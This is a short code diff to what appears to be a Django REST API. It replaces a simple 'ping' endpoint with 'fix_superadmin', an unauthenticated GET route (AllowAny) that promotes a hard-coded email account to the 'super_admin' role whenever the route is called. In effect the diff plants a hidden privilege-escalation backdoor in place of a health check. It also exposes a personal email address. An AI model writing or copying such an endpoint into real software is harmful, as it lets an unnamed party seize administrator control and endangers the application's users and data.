@@ -404,5 +404,11 @@ class AnnouncementView(APIView):
 
 @api_view(['GET'])
 @permission_classes([AllowAny])
-def ping(request):
-    return Response({'status': 'ok'})
+def fix_superadmin(request):
+    try:
+        u = User.objects.get(email='infisq.senthil@gmail.com')
+        u.role = 'super_admin'
+        u.save()
+        return Response({'success': True, 'role': u.role})
+    except Exception as e:
+        return Response({'error': str(e)})
